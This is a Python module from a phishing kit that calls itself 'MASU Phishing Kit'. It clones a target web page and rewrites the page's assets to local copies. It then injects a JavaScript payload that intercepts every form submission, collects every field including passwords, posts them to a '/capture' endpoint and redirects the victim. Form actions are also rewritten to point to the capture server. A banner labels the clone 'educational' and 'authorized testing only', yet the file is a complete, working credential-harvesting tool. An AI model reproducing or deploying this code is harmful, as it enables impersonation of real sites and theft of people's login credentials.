"""
Cloner module — fetches a target page, downloads linked assets,
rewrites paths to local, and injects a credential capture payload.
"""

import os
import re
import time
import hashlib
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "..", "output")
ASSETS_DIR = os.path.join(OUTPUT_DIR, "assets")

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )
}

CAPTURE_SCRIPT = """
<script>
/* MASU Phishing Kit — credential capture inject */
(function() {
  var forms = document.querySelectorAll('form');
  forms.forEach(function(form) {
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      var data = {};
      var inputs = form.querySelectorAll('input, textarea, select');
      inputs.forEach(function(inp) {
        if (inp.name && inp.type !== 'submit' && inp.type !== 'button') {
          data[inp.name || inp.id || inp.type] = inp.value;
        }
      });
      fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).then(function() {
        window.location.href = '/redirect';
      });
    });
  });
})();
</script>
"""


class Cloner:
    def __init__(self, url: str):
        self.url = url
        self.base_url = self._get_base(url)
        self.session = requests.Session()
        self.session.headers.update(HEADERS)

    def _get_base(self, url: str) -> str:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def _safe_filename(self, url: str) -> str:
        name = hashlib.md5(url.encode()).hexdigest()[:12]
        ext = os.path.splitext(urlparse(url).path)[-1]
        ext = ext if ext in [".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".ttf"] else ".bin"
        return name + ext

    def _download_asset(self, url: str) -> str | None:
        """Download a single asset, return local relative path."""
        try:
            r = self.session.get(url, timeout=8)
            if r.status_code != 200:
                return None
            os.makedirs(ASSETS_DIR, exist_ok=True)
            filename = self._safe_filename(url)
            path = os.path.join(ASSETS_DIR, filename)
            with open(path, "wb") as f:
                f.write(r.content)
            return f"assets/{filename}"
        except Exception as e:
            print(f"  [!] Asset download failed: {url} → {e}")
            return None

    def _rewrite_assets(self, soup: BeautifulSoup) -> BeautifulSoup:
        """Download and rewrite all linked assets to local paths."""
        # CSS <link>
        for tag in soup.find_all("link", rel="stylesheet"):
            href = tag.get("href")
            if href:
                abs_url = urljoin(self.url, href)
                local = self._download_asset(abs_url)
                if local:
                    print(f"  [+] CSS: {abs_url[:60]}")
                    tag["href"] = local

        # <script src>
        for tag in soup.find_all("script", src=True):
            src = tag.get("src")
            if src:
                abs_url = urljoin(self.url, src)
                local = self._download_asset(abs_url)
                if local:
                    print(f"  [+] JS:  {abs_url[:60]}")
                    tag["src"] = local

        # <img>
        for tag in soup.find_all("img"):
            src = tag.get("src")
            if src and not src.startswith("data:"):
                abs_url = urljoin(self.url, src)
                local = self._download_asset(abs_url)
                if local:
                    tag["src"] = local

        # inline style background-image urls
        for tag in soup.find_all(style=True):
            style = tag["style"]
            urls = re.findall(r'url\(["\']?(https?://[^"\')\s]+)["\']?\)', style)
            for u in urls:
                local = self._download_asset(u)
                if local:
                    style = style.replace(u, local)
            tag["style"] = style

        return soup

    def _inject_capture(self, soup: BeautifulSoup) -> BeautifulSoup:
        """
        Inject the credential capture script before </body>.
        Also patch form actions to point to /capture.
        """
        # Remove existing form actions so they don't redirect away
        for form in soup.find_all("form"):
            form["action"] = "/capture-form"
            form["method"] = "post"

        # Inject our JS capture script
        script_tag = BeautifulSoup(CAPTURE_SCRIPT, "html.parser")
        if soup.body:
            soup.body.append(script_tag)
        else:
            soup.append(script_tag)

        # Add a visible educational banner at top
        banner_html = """
<div id="masu-edu-banner" style="
  position: fixed; top: 0; left: 0; right: 0; z-index: 999999;
  background: #1a1a2e; color: #e94560; font-family: monospace;
  font-size: 13px; padding: 6px 16px; display: flex;
  align-items: center; justify-content: space-between;
  border-bottom: 1px solid #e94560;
">
  <span>⚠ MASU Phishing Kit — Educational Clone | Authorized Testing Only</span>
  <span style="color:#888; font-size:11px;">github.com/Maty156</span>
</div>
<div style="height: 36px;"></div>
"""
        banner_tag = BeautifulSoup(banner_html, "html.parser")
        if soup.body:
            soup.body.insert(0, banner_tag)

        return soup

    def clone(self) -> str | None:
        try:
            print(f"[*] Fetching page...")
            r = self.session.get(self.url, timeout=15)
            r.raise_for_status()
        except Exception as e:
            print(f"[-] Failed to fetch URL: {e}")
            return None

        soup = BeautifulSoup(r.text, "html.parser")
        title = soup.title.string if soup.title else self.url
        print(f"[*] Page title: {title}")
        print(f"[*] Downloading assets...")

        soup = self._rewrite_assets(soup)
        soup = self._inject_capture(soup)

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        index_path = os.path.join(OUTPUT_DIR, "index.html")
        with open(index_path, "w", encoding="utf-8") as f:
            f.write(str(soup))

        # Save metadata
        meta_path = os.path.join(OUTPUT_DIR, "meta.txt")
        with open(meta_path, "w") as f:
            f.write(f"target_url={self.url}\n")
            f.write(f"cloned_at={time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"title={title}\n")

        return index_path
